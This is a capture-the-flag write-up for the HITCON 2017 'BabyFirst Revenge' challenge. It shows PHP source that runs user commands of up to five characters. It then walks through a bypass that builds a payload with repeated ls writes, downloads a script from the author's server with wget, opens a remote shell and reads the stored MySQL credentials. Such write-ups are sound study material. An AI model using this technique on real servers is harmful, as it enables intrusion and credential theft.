# BabyFirst-Revenge-HITCOIN-2017-QUALS

When we visite site, we see
#### Source Code:
```
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__); 
```
Here we can execute commands on server, which are <=5.  There is an easy way how to solve this task with the help of \ symbol, but i choose the stupid one :D 
The main idea is to write a php script, which will execute shell command  
``` wget myserverip ```  
, and then run it with  
``` sh index.html ( sh i*) ```  
  
  We will use ```ls``` command to write php code in file. But the main difficulty is that ```ls>>a``` will first make file ```a```, and then prints it with other files. So i decided to name my file as ```%0d```. Our task is to produce this code  
``` <?php $a="abcdefghijklmnopqrstuvwxyz0123456789 ";$b=$a;$b[0]=$a[23];$b[1]=$a[7];.....;exec($b); ```  
  
 But we must take into account that we can write only 4 characters per time (>abcd); First we must create file %0d, we request ```http://52.199.204.34/?cmd=>%0d```. Secondly we cant create ```<?php``` , but luckily ```<?=``` will also work. So we run  
 ```
 >\<?=
 ls>>%0d
 rm *=
 ```  
 Ater each file create and file writing, we must delete it in order not to write it again into %0d file. Then we continue create/write our 'gadgets'.  
 ``` 
 >\$a
 ls>>%0d
 rm *a
 
 >=\"
 ls>>%0d
 rm =*
 
 etc.
 ```
 All request we can make with help of burpintruder with timeout between requests 1 second. After sending all requests we run
```
 php ?
```
index.html will be downloaded on target server. Than we run  
```
. i*
```
and get remote shell. In the home directory was login/password for MySql database where flag was stored. Than we simply extract data from it and get the flag. 
